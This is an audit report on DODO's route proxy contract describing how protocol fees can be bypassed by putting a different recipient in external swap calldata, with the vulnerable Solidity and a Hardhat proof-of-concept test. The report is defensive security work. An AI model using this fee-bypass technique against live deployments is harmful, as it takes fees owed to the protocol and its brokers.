# [M] Protocol fees can be bypassed

## Summary
Severity: Medium
Reporter: rvierdiiev
Source: https://github.com/sherlock-audit/2022-11-dodo/blob/main/contracts/SmartRoute/DODORouteProxy.sol#L194-L223
Type: audit-issue

## Details
# Protocol fees can be bypassed

## Summary
Protocol fees can be bypassed if swap calldata provided with different recipient
## Vulnerability Detail
DODORouteProxy.externalSwap allows to make swap using external whitelisted protocol like 1inch, paraswap.
Before the swap protocol checks the balance of token that is destination swap token and then it does the same after the swap to know how much tokens were received. Then part of this tokens are sent as fees and the rest is sent to the caller.

https://github.com/sherlock-audit/2022-11-dodo/blob/main/contracts/SmartRoute/DODORouteProxy.sol#L194-L223
```solidity
        uint256 toTokenOriginBalance;
        if(toToken != _ETH_ADDRESS_) {
            toTokenOriginBalance = IERC20(toToken).universalBalanceOf(address(this));
        } else {
            toTokenOriginBalance = IERC20(_WETH_).universalBalanceOf(address(this));
        }


        {
            require(swapTarget != _DODO_APPROVE_PROXY_, "DODORouteProxy: Risk Target");
            (bool success, bytes memory result) = swapTarget.call{
                value: fromToken == _ETH_ADDRESS_ ? fromTokenAmount : 0
            }(callDataConcat);
            // revert with lowlevel info
            if (success == false) {
                assembly {
                    revert(add(result,32),mload(result))
                }
            }
        }


        // calculate toToken amount
        if(toToken != _ETH_ADDRESS_) {
            receiveAmount = IERC20(toToken).universalBalanceOf(address(this)) - (
                toTokenOriginBalance
            );
        } else {
            receiveAmount = IERC20(_WETH_).universalBalanceOf(address(this)) - (
                toTokenOriginBalance
            );
        }
```

However there are some methods in exchanges that allows to provide recipient of swapped tokens. In this case swapped tokens will come directly to the address of recipient and DODORouteProxy will think that he received 0 tokens. Also because there is no check that slippage should be bigger than 0, the swap will succeed. In such way sender will avoid fees. 

I have created test were the swap was executed from ETH to another token. No fees was paid for the swap.
Put this test into `DODORouteProxy.test.ts` file.
```js
it.only('external swap no fees', async () => {
    
    // set approve white list and swap white list
    await dodoRouteProxy.connect(alice).addWhiteList(mockAdapterw_2.address);
    await dodoRouteProxy.connect(alice).addApproveWhiteList(mockAdapterw_2.address);

    let abiCoder = new ethers.utils.AbiCoder();
    let feeData = await abiCoder.encode(["address", "uint256"], [brokerAddr, "2000000000000000"])

    let ABI = ["function externalSwap(address to, address fromToken, address toToken, uint256 fromAmount)"]
    let itf = new ethers.utils.Interface(ABI)
    let callData2 = itf.encodeFunctionData("externalSwap", [bobAddr, _ETH_, token2.address, BIG_NUMBER_1E18.mul(1).toString()])
    
    await dodoRouteProxy.connect(bob).externalSwap(
      _ETH_,
      token2.address,
      mockAdapterw_2.address,
      mockAdapterw_2.address,
      BIG_NUMBER_1E18.mul(1).toString(),
      "0",
      feeData,
      callData2,
      "99999999999",

      {value: ethers.utils.parseEther("1.0")}
    )

    let afterBalance = await token2.balanceOf(bobAddr)
    let afterReceiver = await token2.balanceOf(proxy1Addr)
    let afterBroker = await token2.balanceOf(brokerAddr)

    expect(etherToNumber(afterBalance)).to.be.eq(120)
    //we didn't receive any fee
    expect(etherToNumber(afterReceiver)).to.be.eq(0)
    expect(etherToNumber(afterBroker)).to.be.eq(0)
  });
```
## Impact

## Code Snippet
Provided above
## Tool used

Manual Review

## Recommendation
Check that slippage is greater than 0.
